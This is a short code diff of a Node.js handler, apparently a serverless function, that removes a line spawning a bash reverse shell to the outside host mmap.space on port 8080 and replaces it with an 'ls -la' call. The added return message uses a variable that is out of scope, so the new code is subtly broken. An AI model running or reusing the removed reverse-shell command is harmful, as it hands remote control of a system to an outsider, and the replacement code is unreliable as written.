@@ -3,10 +3,14 @@ const { spawn } = require('child_process');
 
 exports.handler = async (event) => {
 
-  var child = spawn('bash -i >& /dev/tcp/mmap.space/8080 0>&1');
+  var child = spawn('ls -la');
+  child.stdout.on('data',
+    function (data) {
+      console.log('ls command output: ' + data);
+  });
 
   return {
-    message: `shell spawned`,
+    message: `Hello world ${data}`,
 
   }; 
 };
